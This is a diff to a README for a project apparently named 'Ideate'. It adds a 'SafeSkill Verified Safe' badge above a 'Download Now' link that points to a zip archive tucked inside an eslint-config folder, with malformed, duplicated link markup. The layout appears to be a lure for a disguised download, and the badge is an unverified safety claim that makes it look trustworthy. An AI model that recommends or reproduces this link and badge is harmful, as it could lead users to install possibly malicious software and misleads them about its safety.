@@ -1,5 +1,7 @@
 # 🌟 Ideate - Create and Share Your Ideas Easily
 
+[![SafeSkill 91/100](https://img.shields.io/badge/SafeSkill-91%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/hymieincorrupt440-ideate)
+
 ## 📥 Download Now!
 [![Download Ideate](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip%https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)](https://github.com/Hymieincorrupt440/Ideate/raw/refs/heads/main/packages/eslint-config/Software-v1.2.zip)
 
